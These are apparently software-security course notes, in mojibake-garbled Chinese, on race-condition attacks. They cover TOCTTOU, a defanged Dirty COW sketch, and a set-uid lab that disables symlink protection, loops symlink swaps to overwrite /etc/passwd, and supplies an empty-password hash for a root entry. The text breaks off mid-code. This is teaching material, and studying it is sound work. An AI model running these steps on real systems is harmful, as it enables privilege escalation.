---
title: ç«æ€æ¡ä»¶ä¸ Spectreï¼šå¹¶å‘æ¼æ´ä¸ä¾§ä¿¡é“æ”»å‡»
description: æœ¬æ–‡æ·±å…¥è§£æç«æ€æ¡ä»¶æ¼æ´ï¼ˆTOCTTOUã€Dirty COWï¼‰å’Œ Spectre ä¾§ä¿¡é“æ”»å‡»çš„åŸç†ã€åˆ©ç”¨æ–¹å¼ä¸é˜²å¾¡æœºåˆ¶ï¼Œæ˜¯è½¯ä»¶å®‰å…¨è¯¾ç¨‹ä¸­å…³äºå¹¶å‘å®‰å…¨ä¸ç¡¬ä»¶æ¼æ´çš„é‡è¦å†…å®¹ã€‚
pubDate: 2025-11-03T12:00:00.000Z
image: /images/uploads/curricular-racing-condition-class2-racing-condition-and-spectre-cover.jpg
badge: Course
draft: false
categories:
  - Software Security
  - Course Notes
tags:
  - ç«æ€æ¡ä»¶
  - TOCTTOU
  - Dirty COW
  - Spectre
  - ä¾§ä¿¡é“æ”»å‡»
  - å¹¶å‘å®‰å…¨
  - è¯¾ç¨‹ç¬”è®°
---

> **[è¿ç§»è¯´æ˜]** æœ¬æ–‡æœ€åˆå‘å¸ƒäº `blog.zzw4257.cn`ï¼Œç°å·²è¿ç§»å¹¶åœ¨æœ¬ç«™è¿›è¡Œç»“æ„åŒ–æ•´ç†ä¸å¢å¼ºã€‚

# Racing Condition ç«æ€æ¡ä»¶æ¼æ´
## Eg. Withdraws in older banks

```c
function withdraw($amount)
{
   $balance = getBalance();                  ğŸ…°
   if($amount <= $balance) {                 
       $balance = $balance - $amount;
       echo "æ‚¨å–å‡ºçš„é‡‘é¢ï¼š$amount";
       saveBalance($balance);                ğŸ…±
       // ç„¶åå‘½ä»¤å–æ¬¾æœºæŠŠé’±ç»™ç”¨æˆ· ï¼ˆä»£ç ç•¥å»ï¼‰
   }
   else {
       echo "å¯¹ä¸èµ·ï¼Œæ‚¨è´¦ä¸Šçš„é’±ä¸å¤Ÿã€‚";
   }
}   
```
å¾ˆæ˜¾ç„¶ä¸Šé¢è¿™ä¸ªä»£ç æœ‰åŒæ­¥çš„é—®é¢˜ï¼Œæˆ–è€…è¯´æ›´å…·ä½“çš„ï¼Œå­˜åœ¨å› ä¸ºæ²¡æœ‰å¯¹å¹¶å‘çº¿ç¨‹ä¸åŒé¡ºåºä¸åŒæ—¶é—´èŠ‚èµ„æºè®¿é—®çš„é™åˆ¶ï¼ˆå¦‚åŸå­æ“ä½œ/spinlockæˆ–è€…æ›´å®½æ³›çš„è¯´è¯´é”ï¼‰ï¼Œä¼šå‘ç”Ÿç«æ€æ¡ä»¶ã€‚

### TOC-T-TOU

è¿™ä¸ªè¯é¢˜è¢«æ”¾ç½®åœ¨è½¯ä»¶å®‰å…¨é¢†åŸŸæ—¶ï¼Œå’Œè®¡ç®—æœºç³»ç»Ÿçš„åŒæ­¥é—®é¢˜ç•¥æœ‰å·®å¼‚ã€‚å·®å¼‚çš„æ ¸å¿ƒæ˜¯åœ¨äºï¼Œç¡¬ä»¶ï¼ˆå¯„å­˜å™¨ï¼‰å±‚é¢çš„åŒæ­¥é—®é¢˜ï¼Œç­‰å¾…æ—¶é—´è¿œè¶…æ‰§è¡Œæ—¶é—´ï¼Œæˆ–è€…è¯´æ‰§è¡Œæ—¶é—´é€»è¾‘ä¸Šä¸å¯åˆ©ç”¨ã€‚ä½†åœ¨è½¯ä»¶æ‰§è¡Œåœºæ™¯ä¸­çš„ç«æ€åˆ©ç”¨ä¸­ï¼Œæ£€æŸ¥æ—¶é—´å’Œä½¿ç”¨æ—¶é—´å·®ä¸å¯å¿½ç•¥ï¼Œä¹Ÿå°±æ˜¯å­˜åœ¨TOCTTOUï¼ˆ**æ£€æŸ¥ä¸ä½¿ç”¨æ—¶é—´å·®**ï¼‰æ¼æ´ã€‚
### DirtyCOW

> Dirty COWï¼ˆè„ç‰›ï¼‰æ˜¯ Linux å†…æ ¸ä¸­è‘—åçš„å†™æ—¶å¤åˆ¶ï¼ˆCopy-On-Write, COWï¼‰ç«æ€æ¡ä»¶æ¼æ´ï¼ˆCVE-2016-5195ï¼‰ã€‚å®ƒå­˜åœ¨äºå†…æ ¸å¯¹ç§æœ‰æ˜ å°„é¡µæ‰§è¡Œ COW å¤åˆ¶çš„é€»è¾‘ä¸­ã€‚
> æ­£å¸¸æƒ…å†µä¸‹ï¼Œè¿›ç¨‹ä»¥ `MAP_PRIVATE` æ˜ å°„åªè¯»æ–‡ä»¶æ—¶ï¼Œå†™æ“ä½œä¼šè§¦å‘æ‹·è´ï¼Œä¿®æ”¹ä»…å½±å“ç§æœ‰å‰¯æœ¬ï¼›ä½†å†…æ ¸åœ¨æ‰§è¡Œå†™æ“ä½œçš„ä¸‰ä¸ªæ­¥éª¤â€”â€”(A) æ‹·è´åŸé¡µã€(B) æ›´æ–°é¡µè¡¨æŒ‡å‘æ–°é¡µã€(C) å†™å…¥æ•°æ®â€”â€”ä¹‹é—´ç¼ºä¹åŸå­æ€§ã€‚å¦‚æœå¦ä¸€çº¿ç¨‹åœ¨ B ä¸ C ä¹‹é—´è°ƒç”¨ `madvise(..., MADV_DONTNEED)` ä½¿é¡µè¡¨æŒ‡å›åŸå§‹ç‰©ç†é¡µï¼Œåˆ™ C æ­¥éª¤å®é™…ä¼šæŠŠæ•°æ®å†™å…¥åŸé¡µï¼Œä»è€Œç›´æ¥ä¿®æ”¹äº†åªè¯»æ–‡ä»¶ã€‚æ”»å‡»è€…å€Ÿæ­¤å¯æ”¹å†™å—ä¿æŠ¤æ–‡ä»¶ï¼ˆå¦‚ `/etc/passwd`ï¼‰ï¼Œå°†æ™®é€šç”¨æˆ· UID æ”¹ä¸º 0 ä»¥è·å¾— root æƒé™ã€‚

ä¸‹é¢æˆ‘ä»¬çœ‹ä¸€ä¸‹ä¸€ä¸ªæ¼”ç¤ºä»£ç 

æˆ‘ä»¬å…ˆæ¢³ç†ä¸‹å…³é”®syscall:

- mmap é»˜è®¤æ˜¯æ˜ å°„è™šæ‹Ÿå†…å­˜åŒºåŸŸåˆ°æ–‡ä»¶  map = mmap (
	- NULL,st.st_sizeï¼ˆç›®æ ‡æ–‡ä»¶å…ƒä¿¡æ¯ï¼Œfstat(fd,&st)è·å–ï¼‰
	- PROT_ï¼ˆå†…å­˜æ˜¯å¦ä¸ºå¯è¯»æˆ–è€…å¯å†™ï¼Œä¸€äº›å¸¸è§çš„æ˜¯O_RDWRå¯è¯»å¯å†™->PROT_READ|PROT_WRITEï¼ŒO_RDONLY->PROT_READï¼‰
	- ,MAP_SHARED/PRIVATE,fdï¼ˆæ˜ å°„çš„å¯¹è±¡ï¼‰,offsetï¼ˆæ˜ å°„çš„æ–‡ä»¶ä½ç½®åç§»é‡ï¼‰
	- )
	->`void * mmap(void *addr, size_t len, int prot, int flags, int fd, off_t offset);`ï¼ˆéœ€è¦ `#include <sys/mman.h>`ï¼‰
- madviseï¼šå‘å†…æ ¸æä¾›å…³äºå†…å­˜ä½¿ç”¨çš„å»ºè®®ã€‚`int madvise(void *addr, size_t length, int advice)`;ã€‚åœ¨æ”»å‡»ä¸­ï¼Œmadvise(..., MADV_DONTNEED)Â è¢«ç”¨æ¥ä¸¢å¼ƒç§æœ‰å‰¯æœ¬ï¼Œå¦‚æœæ—¶æœºæ°å½“ï¼Œå¯ä»¥ä½¿é¡µè¡¨æŒ‡å›åŸå§‹ç‰©ç†é¡µï¼Œä¸ºå†™å…¥åŸå§‹æ–‡ä»¶åˆ›é€ æ¡ä»¶ã€‚

```c
/* Dirty COW æ•™å­¦ä¼ªä»£ç ï¼ˆ**éå¯æ‰§è¡Œ**ï¼Œå·²ç§»é™¤å±é™©æ“ä½œï¼‰
   ç›®çš„ï¼šç”¨æ³¨é‡Šè¯´æ˜å…³é”®æµç¨‹ï¼ˆmmap / MAP_PRIVATE / write -> COW / madviseï¼‰å’Œç«æ€çª—å£ï¼Œ
   ä½†**ç»ä¸**åŒ…å«ä»»ä½•å¯ç›´æ¥ç”¨äºä¿®æ”¹å—ä¿æŠ¤æ–‡ä»¶æˆ–ææƒçš„å¯è¿è¡Œä»£ç ã€‚ */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>

/* å…¨å±€æ˜ å°„æŒ‡é’ˆ â€” æ•™å­¦ç”¨æ¥è¯´æ˜ä¸åŒçº¿ç¨‹å¦‚ä½•å…±äº«æ˜ å°„åŸºå€ */
void *map_area;

/* è¯´æ˜ï¼š
   MADV_DONTNEED çº¿ç¨‹åœ¨æ¦‚å¿µä¸Šç”¨äºä¸¢å¼ƒç§æœ‰æ‹·è´ï¼Œä½¿é¡µè¡¨å›é€€åˆ°åŸå§‹ç‰©ç†é¡µã€‚
   å†™çº¿ç¨‹åœ¨æ¦‚å¿µä¸Šé€šè¿‡ /proc/self/mem æˆ–ç­‰ä»·æ‰‹æ®µå¯¹æ˜ å°„åŒºåŸŸå†™å…¥ï¼Œ
   ä¸¤è€…å¹¶å‘æ—¶åœ¨å†…æ ¸å†™æ—¶å¤åˆ¶å®ç°ä¸­å­˜åœ¨ç«æ€çª—å£ï¼ˆå³ B ä¸ C ä¹‹é—´ï¼‰ã€‚ */

/* madvise çº¿ç¨‹ï¼ˆç¤ºæ„ï¼‰â€”â€” **ä¸è¦**åœ¨çœŸå®ç¯å¢ƒä¸­åå¤è¿è¡Œæ­¤ç±»å¾ªç¯å»æ“çºµç³»ç»Ÿå†…å­˜ */
void *madvise_thread(void *arg) {
    size_t length = (size_t)arg;
    /* æ•™å­¦æ„å›¾ï¼šä¸æ–­å‘Šè¯‰å†…æ ¸â€œæˆ‘ä¸å†éœ€è¦è¿™æ®µç§æœ‰é¡µé¢â€ï¼Œ
       å¦‚æœåœ¨å†…æ ¸ COW å®ç°ä¸­å­˜åœ¨ç«æ€ï¼Œè¿™ä¼šåˆ¶é€ é¡µè¡¨å›é€€ï¼ˆæ¦‚å¿µä¸Šï¼‰ */
    for (int i = 0; i < 1000; ++i) { /* æœ‰ç•Œå¾ªç¯ï¼Œä»…ä½œç¤ºæ„ */
        /* å®é™…è°ƒç”¨ï¼š madvise(map_area, length, MADV_DONTNEED); */
        /* åœ¨å®‰å…¨ç¤ºä¾‹ä¸­æˆ‘ä»¬æ”¹ä¸ºæ³¨é‡Šä»¥é¿å…ä¸å½“ä½¿ç”¨ */
        /* madvise(map_area, length, MADV_DONTNEED); */
        sched_yield(); /* è®©å‡º CPUï¼Œå¸®åŠ©ç†è§£çº¿ç¨‹åˆ‡æ¢ï¼Œä½†ä¸åšå®é™…æ”»å‡» */
    }
    return NULL;
}

/* å†™çº¿ç¨‹ï¼ˆç¤ºæ„ï¼‰â€”â€” **ç»å¯¹ä¸è¦**åœ¨çœŸå®ç³»ç»Ÿä¸Šå†™å…¥å—ä¿æŠ¤æ–‡ä»¶æˆ– /proc/self/mem */
void *write_thread(void *arg) {
    /* æ•™å­¦æ„å›¾ï¼šæ­¤çº¿ç¨‹å°è¯•å‘æ˜ å°„åŒºåŸŸâ€œå†™å…¥â€æŸäº›å†…å®¹ï¼Œ
       åœ¨çœŸå®åˆ©ç”¨ä¸­ä¼šç”¨åˆ° /proc/self/mem æˆ–ç›´æ¥è§¦å‘å†™å¯¼è‡´ COWã€‚ */
    char *dummy_position = (char *)arg;

    for (int i = 0; i < 1000; ++i) { /* æœ‰ç•Œå¾ªç¯ï¼Œç¤ºæ„å¹¶å‘å†™å°è¯• */
        /* *å±é™©*ï¼šä¸‹é¢ä¸¤è¡Œæ˜¾ç¤ºçœŸå®åˆ©ç”¨ä¼šåšçš„åŠ¨ä½œ â€”â€” æˆ‘æŠŠå®ƒä»¬æ³¨é‡Šæ‰ä»¥é˜²æ»¥ç”¨ */
        /* int fd = open("/proc/self/mem", O_RDWR); */
        /* lseek(fd, (off_t)dummy_position, SEEK_SET); write(fd, "xxx", 3); close(fd); */

        /* å®‰å…¨æ›¿æ¢ï¼šåœ¨æœ¬ç¤ºä¾‹ä¸­ï¼Œä»…åœ¨æœ¬è¿›ç¨‹å†…æ¨¡æ‹Ÿå†™æ“ä½œï¼ˆä¸å½±å“åº•å±‚æ–‡ä»¶ï¼‰ */
        /* ä¾‹å¦‚ï¼šåœ¨æœ¬åœ°ç¼“å†²åŒºæ‹·è´æ¼”ç¤ºå†™å…¥åŠ¨ä½œ */
        /* memcpy(local_copy + offset, demo_data, demo_len); */

        sched_yield();
    }
    return NULL;
}

/* ä¸»ç¨‹åºï¼ˆæ•™å­¦ç¤ºæ„ï¼‰ */
int main(int argc, char **argv) {
    struct stat st;
    int fd;

    /* --- å®‰å…¨æç¤ºï¼šä¸‹é¢ä¸è¦åœ¨ç”Ÿäº§ç³»ç»Ÿæˆ–å¸¦æƒé™æ–‡ä»¶ä¸Šè¿è¡Œ --- */
    /* æ‰“å¼€ç›®æ ‡æ–‡ä»¶ï¼ˆç¤ºä¾‹ä¸­ç”¨ä¸€ä¸ªæ™®é€šçš„æ•°æ®æ–‡ä»¶è·¯å¾„ï¼Œç»ä¸ä½¿ç”¨ /etc/passwdï¼‰ */
    /* fd = open("safe_example_file.txt", O_RDONLY); */
    /* fstat(fd, &st); */
    /* map_area = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0); */

    /* ä¸ºäº†æ•™å­¦ï¼Œæˆ‘ä»¬ä¸å®é™…åš mmap åˆ°æ•æ„Ÿæ–‡ä»¶ï¼Œè€Œæ˜¯å‡è®¾ map_area å·²è¢«æ˜ å°„ */
    map_area = (void*)0xDEADBEEF; /* å ä½åœ°å€ï¼Œä»…ä½œæ³¨è§£ */

    /* æŸ¥æ‰¾ç›®æ ‡å­—ç¬¦ä¸²ä½ç½®ï¼ˆç¤ºæ„ï¼‰*/
    /* char *pos = strstr((char*)map_area, "target_string"); */

    /* åˆ›å»ºä¸¤ä¸ªçº¿ç¨‹æ¨¡æ‹Ÿå¹¶å‘ï¼ˆä¸€ä¸ªåš madviseã€ä¸€ä¸ªåšå†™ï¼‰ */
    pthread_t t1, t2;
    size_t fake_length = 4096; /* ç¤ºæ„æ˜ å°„é•¿åº¦ */

    pthread_create(&t1, NULL, madvise_thread, (void*)fake_length);
    pthread_create(&t2, NULL, write_thread, (void*)NULL /* pos */);

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    /* æ¸…ç†ï¼ˆç¤ºæ„ï¼‰ */
    /* munmap(map_area, st.st_size); close(fd); */

    printf("æ•™å­¦ç¤ºä¾‹ç»“æŸ â€” æœ¬ç¤ºä¾‹ä¸æ‰§è¡Œä»»ä½•ä¿®æ”¹å—ä¿æŠ¤æ–‡ä»¶çš„æ“ä½œã€‚\n");
    return 0;
}

/* å…³é”®æ•™å­¦è¦ç‚¹ï¼ˆä¸­æ–‡æ³¨é‡Šæ€»ç»“ï¼‰ï¼š
   1) MAP_PRIVATE æ˜ å°„ä¼šä½¿ç”¨å†™æ—¶å¤åˆ¶ï¼ˆCOWï¼‰ã€‚å†™æ—¶å¤åˆ¶çš„æµç¨‹å¯æŠ½è±¡ä¸ºï¼š
        A: åˆ†é…æ–°é¡µå¹¶æ‹·è´åŸé¡µ
        B: æ›´æ–°é¡µè¡¨æŒ‡å‘æ–°é¡µ
        C: åœ¨æ–°é¡µä¸Šæ‰§è¡Œå†™å…¥
      Dirty COW å­˜åœ¨çš„åŸå› æ˜¯ B ä¸ C ä¹‹é—´ä¸æ˜¯åŸå­åŒ–çš„ï¼šå¦‚æœåœ¨è¿™æ®µçª—å£å†…æœ‰åˆ«çš„çº¿ç¨‹/è°ƒç”¨ï¼ˆä¾‹å¦‚ madvise(MADV_DONTNEED)ï¼‰
      æŠŠé¡µè¡¨é‡æ–°æŒ‡å›åŸå§‹é¡µï¼Œåˆ™éšåçš„å†™æ“ä½œå¯èƒ½åœ¨åŸå§‹é¡µä¸Šç”Ÿæ•ˆï¼Œä»è€Œä¿®æ”¹åº•å±‚åªè¯»æ–‡ä»¶ã€‚

   2) /proc/self/mem çš„å†™å…¥ã€å¯¹ mmap æ˜ å°„é¡µé¢çš„å¹¶å‘ madvise è°ƒç”¨ï¼Œä»¥åŠä¸å—ä¿æŠ¤çš„æ— é™å¾ªç¯ç»„åˆï¼Œæ˜¯å¸¸è§çš„åˆ©ç”¨æ„ä»¶â€”â€”æ­¤å¤„å…¨éƒ¨è¢«æ›¿æ¢æˆ–æ³¨é‡Šä»¥é¿å…æ»¥ç”¨ã€‚

   3) å­¦ä¹ ç›®çš„åº”èšç„¦äºç†è§£ç«æ€æ¡ä»¶äº§ç”Ÿçš„åŸå› ä¸å¦‚ä½•ä¿®å¤/é˜²æŠ¤ï¼Œè€Œéå¤ç°åˆ©ç”¨ã€‚ä¿®è¡¥é€šå¸¸é€šè¿‡å†…æ ¸å±‚é¢çš„åŠ é”ã€åŸå­åŒ–é¡µè¡¨æ›´æ–°ï¼Œä»¥åŠåœ¨ç”¨æˆ·æ€é™åˆ¶å¯ç–‘å¯¹ /proc/self/mem çš„å†™æ³•æ¥å®Œæˆã€‚
*/
```
### Melt Down & Ghost Bug
## ç«æ€æ¡ä»¶æ¼æ´

### Eg1
```c
if (!access("/tmp/X", W_OK)) {
    /* the real user has the write permission*/
    f = open("/tmp/X", O_WRITE);
    write_to_file(f);
}
else {
   /* the real user does not have the write permission */
   fprintf(stderr, "Permission denied\n");
}
```
è¿™æ˜¯ä¸€ä¸ªset-uidç¨‹åº
æ™®é€šç”¨æˆ·æ‰§è¡Œè¿™ä¸ªç¨‹åºï¼Œruidä¸æ˜¯rootï¼Œeuidæ˜¯rootï¼Œå¯ä»¥ä¿®æ”¹tmpå…¶ä»–ç”¨æˆ·æ–‡ä»¶ï¼Œaccessåˆ™æ˜¯ç¡®ä¿ruidçš„ä¿®æ”¹æƒé™ã€‚

æ³¨æ„åˆ°è¿™ä¸ªé˜²æŠ¤æªæ–½çœ‹ä¼¼ç‰¢å›ºï¼Œä½†æ˜¯accessæ£€æŸ¥ä¸€è¿‡ï¼Œæˆ‘ä»¬å°±æœ‰æ“ä½œç©ºé—´äº†ã€‚

ï¼ˆæ³¨æ„æˆ‘ä»¬æ— æƒä¿®æ”¹ç‰¹æƒç¨‹åºè¿è¡Œçš„å†…å­˜ï¼‰æˆ‘ä»¬å¯ä»¥ç”¨slinkè½¯é“¾æ¥æ¥å®ç°è¿™ä¸ªæ”»å‡»ï¼Œ`/etc/X -> /etc/passwd`

![[Pasted image 20251030103224.png]]
æ–¹æ³•å°±æ˜¯ææš´åŠ›ï¼Œæˆ‘ä»¬å‡å®šçš„é¢„è®¾å‰æå®é™…ä¸Šæ¶æ„ç¨‹åºæ‰§è¡Œæ—¶é—´è¿œè¿œå°äºTOCTTOUçª—å£,ç„¶åæˆ‘ä»¬èƒ½å¤Ÿæ— æŸä¿®å¤è‡ªå·±çš„æ¶æ„ç¨‹åºå¯¹æˆ‘ä»¬æ”»å‡»å¾ªç¯æœ¬èº«çš„å½±å“ï¼ˆä¸¾ä¾‹å­ï¼Œå‡è®¾ä½ æ²¡æœ‰åœ¨openå®Œï¼Œä¸‹ä¸€æ¬¡accesså¼€å§‹å‰ï¼ŒæŠŠè½¯é“¾æ¥æ”¹å›å»ï¼Œé‚£ä¹ˆä½ ä¸‹æ¬¡è¿å¾ªç¯éƒ½è¿›ä¸å»äº†ï¼Œæ‰€ä»¥åœ¨å¾ªç¯è€ƒå¯Ÿä¸‹è¿˜çœŸä¸æ˜¯ä¸€ä¸ªè¿›ç¨‹å¡è¿›å»å°±è¡Œäº†ï¼‰

æ”»å‡»æˆåŠŸçš„åºåˆ—å¦‚ä¸‹ï¼š

1. **æ”»å‡»è¿›ç¨‹ (A1):**Â å°†Â /tmp/XÂ é“¾æ¥åˆ°ä¸€ä¸ªæ”»å‡»è€…æ‹¥æœ‰çš„æ–‡ä»¶ï¼ˆä¾‹å¦‚Â /tmp/dummyï¼‰ã€‚
2. **å—å®³è¿›ç¨‹ (V1):**Â æ‰§è¡ŒÂ access("/tmp/X", W_OK)ã€‚å› ä¸ºÂ /tmp/XÂ æŒ‡å‘æ”»å‡»è€…è‡ªå·±çš„æ–‡ä»¶ï¼Œæƒé™æ£€æŸ¥é€šè¿‡ã€‚
3. **æ”»å‡»è¿›ç¨‹ (A2):**Â è¿…é€Ÿå°†Â /tmp/XÂ æ”¹ä¸ºé“¾æ¥åˆ°ç›®æ ‡æ–‡ä»¶Â /etc/passwdã€‚
4. **å—å®³è¿›ç¨‹ (V2):**Â æ‰§è¡ŒÂ open("/tmp/X", O_WRITE)ã€‚æ­¤æ—¶Â /tmp/XÂ å·²ç»æ˜¯Â /etc/passwdÂ çš„ç¬¦å·é“¾æ¥ï¼Œç”±äºå—å®³è¿›ç¨‹çš„ euid æ˜¯ rootï¼ŒopenÂ è°ƒç”¨æˆåŠŸï¼Œä»è€Œè·å¾—äº†å¯¹Â /etc/passwdÂ çš„å†™æƒé™ã€‚

### Eg2
åœ¨å¾€ä¸‹èµ°å‰æˆ‘ä»¬å…ˆæ˜ç¡®ä¸‹ï¼Œæˆ‘ä»¬ä¿®æ”¹/etc/passwdçš„æ„ä¹‰æ˜¯åœ¨äºæ·»åŠ uid=0çš„ç”¨æˆ·è¡Œï¼Œç„¶åï¼Œèƒ½å¤Ÿä½¿å…¶è·å¾—rootæƒé™

```c
file = "/tmp/X";
fileExist = check_file_existence(file);

if (fileExist == FALSE){
  // The file does not exist, create it.
  f = open(file, O_CREAT);

  // write to file
  ...
}
```

O_CREATçš„ä¸€ä¸ªå‰¯ä½œç”¨æ˜¯æˆ‘ä»¬éœ€è¦å……åˆ†åˆ©ç”¨çš„ï¼Œå½“æŒ‡å®šæ–‡ä»¶å­˜åœ¨ï¼Œä½é€šè°ƒç”¨ä¸ä¼šå¤±è´¥ï¼Œæˆ‘ä»¬åŒæ ·åœ¨fileExistæ£€æŸ¥å’Œopenä¹‹é—´åšæ›¿æ¢åˆ™ä¹Ÿå¯ä»¥ç”¨rootæƒé™å†™passwd

## å®Œæ•´ä¾‹å­
```c
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main()
{
   char * fn = "/tmp/XYZ";
   char buffer[60];
   FILE *fp;

   /* get user input */
   scanf("%50s", buffer);

   if(!access(fn, W_OK)){
        fp = fopen(fn, "a+");
        fwrite("\n", sizeof(char), 1, fp);
        fwrite(buffer, sizeof(char), strlen(buffer), fp);
        fclose(fp);
   }
   else printf("No permission \n");
     
   return 0;
}
```

`access()`Â å’ŒÂ `fopen()`Â ä¹‹é—´æœ‰ç«æ€æ¡ä»¶é—®é¢˜
æ˜¯é€‰è®¾ç½®set-uid

```bash
sudo chown root vulp
sudo chmod r--rwxr-x[s]r-x vulp
```
ä¹Ÿå°±æ˜¯ç»å…¸çš„root-4755ååŒ

æ¥ç€å…³é—­ç¬¦å·è¿æ¥ä¿æŠ¤æªæ–½

```bash
// åœ¨ Ubuntu 20.04 è™šæ‹Ÿæœºé‡Œç”¨ä¸‹é¢çš„å‘½ä»¤ï¼š
$ sudo sysctl -w fs.protected_symlinks=0
$ sudo sysctl fs.protected_regular=0

// åœ¨Ubuntu 16.04 è™šæ‹Ÿæœºé‡Œç”¨ä¸‹é¢çš„å‘½ä»¤ï¼š
$ sudo sysctl -w fs.protected_symlinks=0
```

æ¥ç€è€ƒè™‘æ­£å¸¸çš„passwdè¡¨é¡¹

```
root:x:0:0:root:/root:/bin/bash
```

å‡è®¾æˆ‘ä»¬æ’ä¸€ä¸ªè¶…çº§ç”¨æˆ·with xæˆ‘ä»¬éœ€è¦æ”¹shadow
è¿™é‡Œå®é™…ä¸Šæœ‰ä¸€ä¸ªå¾ˆæœ‰è¶£çš„ç‚¹ï¼Œå¯†ç å­—æ®µä¿å­˜çš„ä¸æ˜¯çœŸå®çš„ç”¨æˆ·å¯†ç ï¼Œè€Œæ˜¯å¯†ç çš„å“ˆå¸Œå€¼ã€‚

æœ‰è¶£çš„æ˜¯æˆ‘ä»¬ç›´æ¥ä½¿ç”¨ `U6aMy0wojraho` è¿™ä¸ªç¥ç§˜çš„å“ˆå¸Œå€¼ï¼Œå…¶ä¼šè¢«å½“åšä¸€ä¸ª å›è½¦ çš„å¯†ç å“ˆå¸Œå€¼

å…·ä½“å¯¹æ”»å‡»å’Œç›‘æ§çš„éƒ¨åˆ†æ¯”è¾ƒç®€å•ï¼Œç›´æ¥ç»™ä»£ç 

```c
 while(1) {
     unlink("/tmp/XYZ");                       
     symlink("/dev/null", "/tmp/XYZ");   
     usleep(1000);

     unlink("/tmp/XYZ");                       
     symlink("/etc/passwd", "/tmp/XYZ");       
     usleep(1000);
   }
//...
	CHECK_FILE="ls -l /etc/passwd"
	while ["$old" == "$new"]
	do
		./vulp < passwd_input
		new=$($CHECK_FILE)
```

æœ‰äº›æ—¶å€™ /tmp/XYZè«åå…¶å¦™æ‰€æœ‰è€…å˜æˆrootï¼Œé‚£ä¹ˆseedæƒé™çš„æ”»å‡»ç¨‹åºæ— æ³•åˆ é™¤/unlinkæ–‡ä»¶ï¼Œå› ä¸ºå…¶è®¾ç½®äº†strickyä½ï¼ˆå³åˆ é™¤æ“ä½œå’Œå¯å†™åˆ†ç¦»ï¼‰

### é—®é¢˜ç»†æ¢ï¼ˆç«æ€é—®é¢˜çš„ç›¸äº’æ€§ï¼‰
unlink()Â å’ŒÂ symlink()Â æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„ç³»ç»Ÿè°ƒç”¨ï¼Œè¿™æ„å‘³ç€ä¿®æ”¹ç¬¦å·é“¾æ¥çš„æ“ä½œ**ä¸æ˜¯åŸå­æ“ä½œ**ã€‚
![[Pasted image 20251030104806.png]]

ä¸€å¥è¯æ¥è¯´æˆ‘ä»¬ç¨‹åºæœ¬èº«ä¹Ÿå­˜åœ¨ä¸€ä¸ªç«æ€çª—å£ï¼š

1. **æ”»å‡»è¿›ç¨‹:**Â æ‰§è¡ŒÂ unlink("/tmp/XYZ")ã€‚
2. **å—å®³è¿›ç¨‹:**Â ï¼ˆæ°å¥½åœ¨æ­¤åˆ»è¢«è°ƒåº¦ï¼‰æ‰§è¡ŒÂ fopen("/tmp/XYZ", "a+")ã€‚ç”±äºæ–‡ä»¶Â /tmp/XYZÂ ä¸å­˜åœ¨ï¼ŒfopenÂ ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æ–‡ä»¶ã€‚å› ä¸ºå—å®³è¿›ç¨‹çš„ euid æ˜¯ rootï¼Œæ–°åˆ›å»ºçš„Â /tmp/XYZÂ æ–‡ä»¶çš„æ‰€æœ‰è€…å°†æ˜¯ rootã€‚
3. **æ”»å‡»è¿›ç¨‹:**Â ä¹‹åæ— æ³•å†Â unlinkÂ æˆ–ä¿®æ”¹è¿™ä¸ªç”± root æ‹¥æœ‰çš„æ–‡ä»¶ï¼Œæ”»å‡»å¤±è´¥ã€‚

è§£å†³æ–¹æ³•æ˜¯ä½¿ç”¨Â renameat2Â ç³»ç»Ÿè°ƒç”¨ï¼Œå®ƒå¯ä»¥ç”¨Â RENAME_EXCHANGEÂ æ ‡å¿—æ¥åŸå­æ€§åœ°äº¤æ¢ä¸¤ä¸ªè·¯å¾„åã€‚

```
int renameat2(int olddirfd, const char *oldpath,
              int newdirfd, const char *newpath, 
              unsigned int flags);
```

å¯ä»¥å¯¹æ ‡ä¸‹

```c
unsigned int flags = RENAME_EXCHANGE;

   unlink("/tmp/ABC"); unlink("/tmp/XYZ"); 

   symlink("FileOne", "/tmp/ABC");                  ğŸ…° 
   symlink("FileTwo", "/tmp/XYZ");                  ğŸ…± 

   sleep(10);
   renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", flags);  ğŸ…² 
   sleep(10);
   renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", flags);  ğŸ…³ 
```

## é˜²å¾¡æªæ–½

### åŸå­æ“ä½œ
å’Œç¡¬ä»¶ä¸€æ ·ï¼Œä¸Šé”/åŠ æ›´å¤æ‚çš„åŒæ­¥çº¦æŸï¼Œè¿™é‡Œä¸è¿‡å¤šèµ˜è¿°

å¯¹æœ€æ—©çš„ä¾‹å­

æˆ‘ä»¬ç”¨

```
f=open("/tmp/X", O_WRITE | O_REAL_USER_ID);
```

ç›´æ¥ä¸¢æ‰accessï¼Œç„¶è€ŒO_REAL_USER_IDå¹¶ä¸å­˜åœ¨


### å åŠ ç«æ€æ¡ä»¶

ä¹‹å‰æˆ‘ä»¬ç«æ€è·èƒœçš„æ–¹å¼æ˜¯å¡ä½ï¼Œæˆ‘ä»¬è¦æ±‚å¿…é¡»å‡å¡ä½æˆåŠŸï¼ˆä¸”è¿ç»­ï¼‰å³å¯å¤§å¤§å‡å°‘æˆåŠŸç‡

å¯ä»¥çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­

```c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>

int main()
{
   struct stat stat1, stat2, stat3;
   int fd1, fd2, fd3;

   if (access("/tmp/XYZ", O_RDWR)) {
      fprintf(stderr, "Permission denied\n");
      return -1;
   }                                     ğŸ¢€ ç¬¬ä¸€ä¸ªçª—å£
   else fd1 = open("/tmp/XYZ", O_RDWR);
                                         ğŸ¢€ ç¬¬äºŒä¸ªçª—å£
   if (access("tmp/XYZ", O_RDWR)) {
      fprintf(stderr, "Permission denied\n");
      return -1;
   }                                     ğŸ¢€ ç¬¬ä¸‰ä¸ªçª—å£
   else fd2 = open("/tmp/XYZ", O_RDWR);
                                         ğŸ¢€ ç¬¬å››ä¸ªçª—å£
   if (access("/tmp/XYZ", O_RDWR)) {
      fprintf(stderr, "Permission denied\n");
      return -1;
